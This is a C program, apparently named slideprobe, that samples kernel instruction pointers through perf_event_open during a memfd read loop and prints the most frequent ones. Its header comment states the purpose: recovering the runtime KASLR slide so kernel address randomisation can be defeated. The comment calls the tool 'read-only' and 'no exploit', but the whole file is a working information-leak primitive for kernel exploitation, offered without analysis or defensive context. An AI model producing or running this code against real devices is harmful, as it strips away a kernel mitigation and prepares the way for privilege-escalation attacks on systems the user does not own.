/* slideprobe: sample kernel IPs (perf SW cpu-clock, exclude_user) during a
 * memfd self-copy loop and print the distinct kernel text IPs by frequency.
 * Read-only; no exploit, no kernel writes.  Used to recover the runtime KASLR
 * slide by matching a dominant hot-loop IP against kallsyms_fixed ranges. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>

#define MAXC 200000
static uint64_t ipv[MAXC];
static int ipc[MAXC];
static int nc;

static void tally(uint64_t ip) {
  /* only kernel-text shaped */
  if ((ip >> 32) != 0xffffff80ULL) return;
  /* binary search-ish linear (small nc expected) */
  int lo = 0, hi = nc - 1;
  while (lo <= hi) {
    int mid = (lo + hi) / 2;
    if (ipv[mid] == ip) { ipc[mid]++; return; }
    if (ipv[mid] < ip) lo = mid + 1; else hi = mid - 1;
  }
  if (nc >= MAXC) return;
  /* insert sorted */
  int at = lo;
  memmove(&ipv[at+1], &ipv[at], (nc - at) * sizeof(uint64_t));
  memmove(&ipc[at+1], &ipc[at], (nc - at) * sizeof(int));
  ipv[at] = ip; ipc[at] = 1; nc++;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  int fd = syscall(__NR_memfd_create, "x", 0);
  if (fd < 0) { printf("memfd errno=%d\n", errno); return 1; }
  if (ftruncate(fd, 4096) < 0) { printf("ftruncate errno=%d\n", errno); return 1; }
  char *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { printf("mmap errno=%d\n", errno); return 1; }
  memset(m, 0x41, 4096);

  struct perf_event_attr pe; memset(&pe, 0, sizeof pe);
  pe.type = PERF_TYPE_SOFTWARE; pe.size = sizeof pe;
  pe.config = PERF_COUNT_SW_CPU_CLOCK; pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.disabled = 1; pe.exclude_user = 1; pe.exclude_hv = 1; pe.exclude_idle = 1;
  int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (pfd < 0) { printf("perf errno=%d\n", errno); return 1; }
  uint8_t *buf = mmap(NULL, 4096 * 33, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
  if (buf == MAP_FAILED) { printf("perfmmap errno=%d\n", errno); return 1; }
  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  for (long i = 0; i < 500000; i++) { pread(fd, m, 4096, 0); }
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = (void *)buf;
  uint64_t head = hdr->data_head; __sync_synchronize();
  char *base = (char *)buf + 4096; size_t dsz = 4096 * 32; uint64_t pos = hdr->data_tail;
  long nsamp = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip = *(uint64_t *)p;
      nsamp++;
      tally(ip);
    }
    pos += ev->size;
  }
  printf("samples=%ld distinct_ip=%d\n", nsamp, nc);
  /* print top by count repeatedly */
  for (int r = 0; r < 25; r++) {
    int bi = -1;
    for (int k = 0; k < nc; k++) { if (ipc[k] < 0) continue; if (bi < 0 || ipc[k] > ipc[bi]) bi = k; }
    if (bi < 0) break;
    printf("IP %016llx count=%d\n", (unsigned long long)ipv[bi], ipc[bi]);
    ipc[bi] = -1;
  }
  return 0;
}
